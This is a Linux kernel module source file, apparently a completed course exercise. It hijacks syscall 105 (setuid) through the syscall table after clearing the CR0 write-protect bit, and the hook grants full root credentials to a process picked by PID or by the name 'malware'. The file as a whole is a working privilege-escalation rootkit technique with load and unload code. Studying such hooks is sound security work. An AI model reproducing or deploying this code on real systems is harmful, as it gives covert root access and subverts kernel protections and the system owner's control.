#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/time.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <asm/cacheflush.h>
#include <linux/sched/signal.h>
#include <linux/rcupdate.h>
#include <linux/string.h>

#define TARGET_PROC_NAME "malware"
#define __NR_syscall 105

static struct task_struct *target_task = NULL;
static unsigned long *sys_call_table;
static int target_pid = -1;
module_param(target_pid, int, 0);

unsigned int clear_and_return_cr0(void);
void setback_cr0(unsigned int val);
static long sys_mycall(uid_t uid);

int orig_cr0;
static long (*anything_saved)(uid_t);

/* CR0 operation functions */
unsigned int clear_and_return_cr0(void)
{
    unsigned int cr0 = 0;
    unsigned int ret;
    asm volatile ("movq %%cr0, %%rax" : "=a"(cr0));
    ret = cr0;
    cr0 &= 0xfffeffff; // clear WP bit
    asm volatile ("movq %%rax, %%cr0" :: "a"(cr0));
    return ret;
}

void setback_cr0(unsigned int val)
{
    asm volatile ("movq %%rax, %%cr0" :: "a"(val));
}

/* Custom syscall */
static long sys_mycall(uid_t uid)
{
    if (target_task && current == target_task) {
        /* TODO: create new credentials and set UID/GID to 0 */
        struct cred *new;

        new = prepare_creds();
        if (!new)
            return -ENOMEM;

        new->uid   = KUIDT_INIT(0);
        new->gid   = KGIDT_INIT(0);
        new->euid  = KUIDT_INIT(0);
        new->egid  = KGIDT_INIT(0);
        new->suid  = KUIDT_INIT(0);
        new->sgid  = KGIDT_INIT(0);
        new->fsuid = KUIDT_INIT(0);
        new->fsgid = KGIDT_INIT(0);

        commit_creds(new);

        return 0;

    }

    return anything_saved(uid);
}

/* Find target process */
static int find_target_process(void)
{
    struct pid *pid;
    struct task_struct *p;
    if (target_pid > 0) {
        /* TODO: find process by PID and assign target_task */
        if (target_task)
            return 0;

        rcu_read_lock();
        pid = find_get_pid(target_pid);
        if(pid)
        {
            
            p = pid_task(pid, PIDTYPE_PID);
            if(p)
            {
                get_task_struct(p);
                target_task = p;
                put_pid(pid);
                rcu_read_unlock();
                printk(KERN_INFO "Found target process: %s (PID: %d)\n", target_task->comm, task_pid_nr(target_task));
                return 0;
            }
            put_pid(pid);
        }
        rcu_read_unlock();
        return -ESRCH;
    }
    /* TODO: find process by name if PID not specified */
    else
    {
        for_each_process(p)
        {
            if (strcmp(p->comm, TARGET_PROC_NAME) == 0) 
            {
                rcu_read_lock();
                get_task_struct(p);
                target_task = p;
                rcu_read_unlock();
                printk(KERN_INFO "Found target process: %s (PID: %d)\n", target_task->comm, task_pid_nr(target_task));
                return 0;
            }
        }
    }


    return -ESRCH;
}

/* Module init */
static int __init init_hook(void)
{
    printk(KERN_INFO "HookSyscall Module Loaded\n");

    if (find_target_process() != 0)
        return -ESRCH;

    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table)
        return -EINVAL;

    anything_saved = (long (*)(uid_t))sys_call_table[__NR_syscall];

    /* TODO: disable write protection and replace syscall */
    orig_cr0 = clear_and_return_cr0();
    sys_call_table[__NR_syscall] = (unsigned long)sys_mycall;
    setback_cr0(orig_cr0);
    
    printk(KERN_INFO "Installed hook for syscall %d\n", __NR_syscall);
    return 0;
}

/* Module exit */
static void __exit exit_hook(void)
{
    /* TODO: restore original syscall */
    if (sys_call_table && anything_saved) {
        /* 暂时关闭写保护 */
        orig_cr0 = clear_and_return_cr0();

        /* 把 syscall 表项改回去 */
        sys_call_table[__NR_syscall] = (unsigned long)anything_saved;

        /* 恢复 CR0 写保护 */
        setback_cr0(orig_cr0);
    }

    if (target_task) {
        put_task_struct(target_task);
        target_task = NULL;
    }

    printk(KERN_INFO "HookSyscall Module Unloaded\n");
}

module_init(init_hook);
module_exit(exit_hook);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Kernel module to hook syscall for privilege elevation");
